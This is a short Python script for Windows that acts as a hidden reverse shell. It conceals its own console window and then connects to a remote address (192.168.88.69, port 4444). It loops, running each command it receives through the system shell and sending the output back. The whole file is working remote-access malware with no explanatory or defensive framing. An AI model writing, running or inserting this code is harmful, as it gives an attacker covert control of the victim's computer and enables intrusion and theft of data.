import sys
import socket
import subprocess
import win32gui
import win32con

def hide_console():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

SERVER = "192.168.88.69"
PORT = 4444

hide_console()

s = socket.socket()
s.connect((SERVER, PORT))
msg = s.recv(1024).decode()

while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = '[+] Executed'.encode()

    s.send(result)

s.close()
